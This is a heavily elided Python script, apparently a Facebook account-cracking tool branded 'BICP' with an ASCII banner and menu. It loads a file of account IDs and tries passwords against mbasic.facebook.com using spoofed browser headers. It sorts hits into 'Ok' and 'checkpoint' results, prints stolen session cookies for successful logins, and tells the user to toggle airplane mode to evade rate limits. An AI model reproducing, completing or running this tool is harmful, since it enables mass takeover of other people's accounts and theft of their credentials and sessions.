...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mKalam')
...
while attemps < 12345677901:
    ...
    if username == 'BICP' and password == 'PRO':
...
def banner():
  ...
  ##     ##  ##  ##       ##   \033[1;37m       				
  ##     ##  ##  ##    ## ##  \033[1;37m 
  ########  ####  ######  ##\033[1;37m \033[1;37m \033[1;31m MR.BELET\033[1;37m
...
def login():
	banner()
	Kalamj('\033   [1] FILE ClONING')
	Kalamj('\033   [2] CONTACT WITH ADMIN')
	Kalamj('\033   [0] EXIT')
	Kalamj('\033[0;97  ⋞ ════════════════════════ ⋟ ')
	Kalam= input('  [+] CHOOSE: ');time.sleep(0.01)
	if Kalam in ['m']:
		public()
	elif Kalam in ['1']:
		crack_file()
		...
		os.system('xdg-open https://www.facebook.com/xmite.kalamm.34')
	elif Kalam in ['0']:
...
def crack_file():
	os.system('clear')
	banner()
	print('  [+] PUT FILE EXMPLE  :  /sdcard/bicp.txt  Etc...]')
	o = input('  [+] INPUT FILE NAME  : ')
	print('')
...
def passwrd():
	os.system('clear')
	banner()
	print('\033[97;1m  [\033[92;1m+\033[97;1m] TOTAL IDZ :\033[0;97m '+str(len(id)))
	print("\033[97;1m  [\033[92;1m+\033[97;1m] FAST  ")
	print("\033[97;1m  [\033[92;1m+\033[97;1m] TURN ON/OFF AIRPLANE MODE IN EVERY [5] MIN")
	Kalamj(f'⋞ ════════════════════════════════════════════════ ⋟ ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"   \r{bo}[BICP CRACK....] {P}[{h}{loop}{P}]♡[{h}{len(id)}{P}]{bo}◈{P}[{h}Ok{P}⋄{bo}{ok}{P}] "),
	sys.stdout.flush()
    ...
    'dpr': '3.081249952316284',
    'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfcfU57jXGExaWgvR0XJDWKXCm5c29gAqU90I1A_b6i9RasXQxDBAWzLjzoJczkOqi7Rk9SdGtxfjD7s__WWQgntSCAhTVidHfPu729rh_eU4w&smuh=58695&lh=Ac89768BEz99Wb44xfU&wtsid=rdr_0OGvSv1pjctGTXLQv&refid=8&ref_component=mbasic_footer&_rdr',
    ...
    'viewport-width': '980',}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#KALAM
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•BICP-Cp] {idf} • {pw}')     
				...
				#KALAM
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•BICP-Ok] {idf} • {pw}\n\033[0;93☠= COOKIES • \033[0;95m{kuki} ')
				print('\033[0;94m  ⋞ ════════════════════════════════════════════════ ⋟ ')
				os.system('espeak -a 300 " BICP,  Ok,  id"')
